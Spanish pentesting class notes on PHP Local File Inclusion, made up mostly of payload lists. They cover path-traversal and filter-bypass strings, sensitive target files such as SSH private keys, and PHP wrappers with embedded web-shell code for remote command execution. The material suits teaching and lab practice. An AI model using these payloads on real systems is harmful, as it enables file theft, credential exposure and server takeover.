# LFI

Tags: #LFI #DirectoryPathTraversal #PHP 

La vulnerabilidad **Local File Inclusion (LFI)** ocurre cuando una aplicación **no valida correctamente la entrada del usuario**, lo que permite a un atacante incluir o acceder a **archivos locales** en el servidor.

### Funcionamiento
- El atacante manipula parámetros de entrada (ej. en la URL o formularios).
- Se utilizan técnicas de **Path Traversal** (`../`) para navegar por directorios y acceder a archivos sensibles (ej: `/etc/passwd`).

### Riesgos
- Lectura de archivos confidenciales.
- Robo de credenciales o información sensible.
- Ejecución de código en algunos entornos (si se combina con logs u otros vectores).

A continuación, se os proporciona el enlace directo a la herramienta que utilizamos al final de esta clase para abusar de los ‘**Filter Chains**‘ y conseguir así ejecución remota de comandos:

-  [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
- [Lab-LFI](https://github.com/NetsecExplained/docker-labs)

```bash 
Encontrar un parámetro similar a '?page= o ?file=' para ver si existe el LFI

1. Se encuentran en CMS (Gestores de contenido) como WordPress
2. Plugins 

En el LFI se puede usar:
1. 'Path Traversal' para evadir algunos filtros 
2. Wrappers
```

## Archivos importantes 

```bash 
# Archivos generales 
1. /etc/passwd
2. /etc/hosts
3. /etc/hostname 
4. /home/user/.ssh/id_rsa      # Mira la llave privada del usuario (Si existe)
5. /proc/net/fib_trie          # Mirar rangos de IPs en el server 
6. /proc/net/tcp               # Mirar los puertos internos abiertos 


# Si por detras esta Node.js con Mongo 
1. /var/www/dev/index.js       # Archivo principal en JavaScript (Node.js) que arranca la lógica del servidor backend y se puede encontrar credenciales o configuraciones sensibles de MongoDB
2. /opt/blog/server.js
```

## Path Traversal 

```bash 
# Como mejor practica son 6 '../'

❯ /etc/passwd                       # Cargar el archivo desde la raiz  
❯ ../../../../etc/passwd             
❯ ....//....//....//etc/passwd      # Evitar el filtro de 'str_replace' 


# Evitar el filtro 'preg_match' colocando barras y puntos
❯ /etc/////passwd                   
❯ /etc//./passwd                              


# En el comando 'cat' se podría usar '?' para evadir el 'preg_match'
❯ cat /e??/?oh??
❯ cat /et?//??sswd 
❯ cat /??c/pas??? 


# Para evitar concatenar una extension '.php' al archivo a buscar, se puede usar un NULL Byte, esto funciona en versiones < 5.3 en PHP.
❯ /etc/passwd%00                    # Colocar un 'Null Byte'


# En un 'substr' en el código que hace match con alguna extensión, se puede evadir el match colocando '/.' al final para que no exista el match con la extension '.txt'            
❯ /etc/test.txt/.       
```

## Wrappers en la URL de la Web

```bash 
# Los Wrappers ayudan a interpretar el código y no a ejecutarlo 
# Archivos importantes que se pueden encodear con el filtro 
	- index.php
	- admin/db_connect.php


1. # Este filtro representa el contenido en base64
❯ php://filter/convert.base64-encode/resourse=
	❯ cat data | base64 -d | sponge data 
	# d = decodear la base64 
	# sponge = Para ingresar el output en el mismo archivo llamado 'data'


2. # Este wrapper rota cada carácter en 13 posiciones
❯ php://filter/read=string.rot13/resource=
	❯ cat data | tr '[c-za-bC-ZA-B]' '[p-za-oP-ZA-O]'   # Se debe de empezar con la primer letra que aparezca en el output y en la segunda parte colocar en la 13va posición 


3. # Conversión a nivel de 'encoding' para que no sea interpretado y se muestre en la web
❯ php://filter/convert.iconv.utf-8.utf-16/resource=


Notas:
	1. Aveces no es necesario colocar 'php' ya que las páginas lo agregan automáticamente
```

## Wrappers para un RCE

```bash
# Método POST
❯ php://input        
	<?php system('whoami'); ?>      # Esto payload va en el cuerpo de la petición POST
	<?php system($_GET["cmd"]); ?>


# Método GET
❯ expect://whoami     # Este wrapper ayuda a inyectar comandos 


# En este wrapper se le debe pasar una cadena en base64, la cadena es el php que tiene system(GET)
❯ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+    # Forma original 
❯ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2b&cmd=whoami
	# + = %2b


# Si la cadena esta en base64, con este wrapper podemos decodificarlo
❯ php://filter/convert.base64-decode/resourse=

# Si usando el wrapper de arriba regresa un error, usar el siguiente
❯ php://filter/convert.iconv.UTF8.UTF7|convert.base64-decode/resource=
```